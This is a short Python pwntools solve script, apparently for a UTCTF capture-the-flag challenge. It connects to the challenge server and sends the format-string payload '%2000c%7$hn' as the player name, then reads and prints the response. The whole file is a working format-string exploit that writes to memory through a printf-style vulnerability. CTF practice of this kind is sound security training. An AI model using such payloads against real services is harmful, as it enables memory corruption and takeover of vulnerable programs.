#!/usr/bin/env python3
from pwn import args, context, remote


HOST = args.HOST or "challenge.utctf.live"
PORT = int(args.PORT or 7255)


def main() -> None:
    context.log_level = "error"

    io = remote(HOST, PORT)
    io.sendlineafter(b"Enter your name: ", b"%2000c%7$hn")
    io.recvuntil(b"Play a hand?")
    io.sendline(b"n")

    result = io.recvall(timeout=2).decode("utf-8", "replace")
    print(result, end="")


if __name__ == "__main__":
    main()
